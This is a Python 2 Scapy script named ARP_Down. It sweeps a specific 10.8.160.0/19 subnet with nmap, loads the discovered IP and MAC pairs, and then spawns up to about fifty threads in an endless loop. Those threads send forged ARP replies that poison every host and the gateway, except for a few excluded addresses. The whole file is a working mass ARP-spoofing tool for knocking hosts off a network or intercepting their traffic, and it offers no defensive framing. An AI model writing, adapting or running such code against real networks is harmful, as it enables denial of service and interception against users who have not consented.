# -*- coding: utf-8 -*-
from scapy.all import *
import threading
import os

COUNT = 0

class ARP_Down():    
    ipscan='10.8.160.1/19'
    gateway_ip="10.8.160.1"
    gateway_mac="54:39:DF:CE:E9:AD"
    
    
    arp_map = []  
    
    def namp_scan(self):
        os.system("nmap -sP 10.8.160.1/19|egrep \"MAC Address|Nmap scan report\"|awk '{if($1==\"Nmap\"){printf(\"%s\t\",$5)}else{printf(\"%s\n\",$3)} }' >scan.txt")
    
    def readfile(self):
        file_object = open('/root/scan.txt')
        try:
            #all_the_text = file_object.read()
            for line in file_object:
                self.arp_map += [line.replace('\t',' ').replace('\n','').split()]
                #[[line[:10],line[13:30]]]#line.split(' ')
                #print arp_map
        finally:
            file_object.close()
    
    def scan_allip(self):
        try:
            ans,unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ipscan),timeout=5,verbose=False)
        except Exception,e:
            print str(e)
        else:
            for snd,rcv in ans:
                self.arp_map += [[rcv.sprintf("%Ether.src%"),rcv.sprintf("%ARP.psrc%")]]
                #list_mac=rcv.sprintf("%Ether.src% - %ARP.psrc%")
                #print list_mac
            print "[*]Finished ARP Scan."
            
    
    def poison_target(self,target_ip,target_mac):
        global COUNT
        
        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = self.gateway_ip        
        poison_target.pdst = target_ip
        poison_target.hwdst= target_mac
        poison_target.hwsrc= "28:E3:1F:54:EC:19"
    
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.pdst = self.gateway_ip
        poison_gateway.psrc = target_ip
        poison_gateway.hwdst= self.gateway_mac 
        poison_gateway.hwsrc= "20:A6:80:4D:1F:06"
        
        print "Start attack %s" % target_ip
        #print "[*]Beginning the ARP poison.[CTRL-C to stop]"
        
        i=0
        while i<=4:
            try:
                send(poison_target,verbose= False)
                send(poison_gateway,verbose= False)
                i+=1
                #time.sleep(0.5)
            except Exception,e:
                print str(e)
                #restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
                pass
        
        print "[*]ARP poison attack finished."
        COUNT-=1
        
        return 
    
    def start_attack(self):
        global COUNT
        
        while True:
            for [target_ip,target_mac] in self.arp_map:
                #启动ARP偷毒线程  not target_ip == '10.8.165.167' 
                if(not target_ip == '10.8.160.1'
                   and not target_ip == '10.8.165.167' 
                   and not target_ip == '10.8.178.36'):
                    #self.poison_target(target_ip,target_mac)
                    
                    poison_thread = threading.Thread(target= self.poison_target,args=(target_ip,target_mac))
                    if(COUNT <=50):
                        poison_thread.start()
                        COUNT+=1
                        #time.sleep(0.1)
                        #print "\n##############COUNT:%d###################" % COUNT   
                    else:
                        #while COUNT>10:
                        pass

if __name__ == "__main__":
    attack = ARP_Down()
    attack.readfile()
    attack.start_attack()
